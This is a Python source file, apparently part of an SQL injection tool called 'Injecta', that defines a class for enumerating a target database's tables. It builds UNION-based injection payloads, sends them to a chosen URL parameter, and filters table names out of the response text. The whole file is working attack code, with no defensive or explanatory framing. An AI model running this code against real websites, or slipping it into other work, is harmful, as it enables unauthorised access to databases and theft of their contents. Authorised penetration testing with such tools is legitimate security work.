"""
Injecta — Table enumeration
"""
from typing import Any, Dict, List, Optional


class TableEnumerator:
    def __init__(self, requester, config, logger, payloads, injection_info: Dict[str, Any]):
        self.req = requester
        self.config = config
        self.log = logger
        self.payloads = payloads
        self.info = injection_info

    def enumerate(self, url: str, param: str, db: str) -> List[str]:
        tables = []
        queries = self.payloads.tables(db)

        for q in queries:
            results = self._try_extract(url, param, q)
            if results:
                tables.extend(results)
                break

        return list(set(tables))

    def _try_extract(self, url: str, param: str, sql: str) -> List[str]:
        results = []
        payload = f"' UNION {sql}-- -"
        _, resp_text, _ = self.req.test_raw(url, payload, param)
        if resp_text and len(resp_text) > 100:
            import re
            candidates = re.findall(r'(\w[\w$#@.-]+)', resp_text)
            if candidates:
                skip = {'select', 'from', 'where', 'and', 'or', 'null', 'as', 'on', 'union',
                        'table_name', 'column_name', 'information_schema', 'table_schema',
                        'table_catalog', 'table_type', 'is_updatable'}
                results = [c for c in candidates if len(c) > 1 and not c.isdigit()
                          and c.lower() not in skip][:30]
        return results
